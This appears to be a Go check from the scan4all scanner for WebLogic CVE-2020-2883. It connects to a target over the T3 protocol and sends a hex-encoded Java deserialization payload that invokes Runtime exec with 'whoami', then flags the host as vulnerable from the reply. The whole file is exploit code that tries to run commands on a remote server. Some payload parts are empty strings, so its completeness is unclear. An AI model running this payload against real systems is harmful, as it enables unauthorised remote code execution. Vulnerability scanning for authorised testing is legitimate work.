package weblogic

import (
	"encoding/hex"
	"fmt"
	"github.com/hktalent/scan4all/lib/util"
	"net"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"time"
)

func CVE_2020_2883(u string) bool {
	iphost, err := url.Parse(strings.TrimSpace(u))
	if err != nil {
		return false
	}
	conn, err := net.DialTimeout("tcp4", iphost.Host, 10*time.Second)
	if err == nil {
		defer conn.Close()
		cmd := "whoami"
		hex_data, _ := hex.DecodeString("74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a")
		_, err = conn.Write(hex_data)
		time.Sleep(1 * time.Second)
		data1, _ := hex.DecodeString("")
		int_port, _ := strconv.Atoi(iphost.Port())
		data2, _ := hex.DecodeString(fmt.Sprintf("%sffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07", fmt.Sprintf("%04x", int_port)))
		data3, _ := hex.DecodeString("1a7727000d3234322e323134")
		data4, _ := hex.DecodeString("2e312e32353461863d1d0000000078")
		data_arr := [4][]byte{data1, data2, data3, data4}
		for _, data := range data_arr {
			conn.Write(data)
		}
		time.Sleep(2 * time.Second)
		payload := ""
		payload += ""
		payload += fmt.Sprintf("%04x", len(cmd))
		payload += hex.EncodeToString([]byte(cmd))
		payload += "74000465786563770400000003767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707400013178"
		payload += ""
		payload = fmt.Sprintf("%08x%s", len(payload)/2+4, payload)
		payload2, _ := hex.DecodeString(payload)
		conn.Write(payload2)
		buf := make([]byte, 4096)
		conn.Read(buf)
		send, _ := regexp.Match("weblogic", buf)
		security, _ := regexp.Match("Connection rejected", buf)
		if send && !security {
			util.SendLog(u, "CVE-2020-2883", "Found vuln Weblogic", payload)
			return true
		}
	}
	return false
}
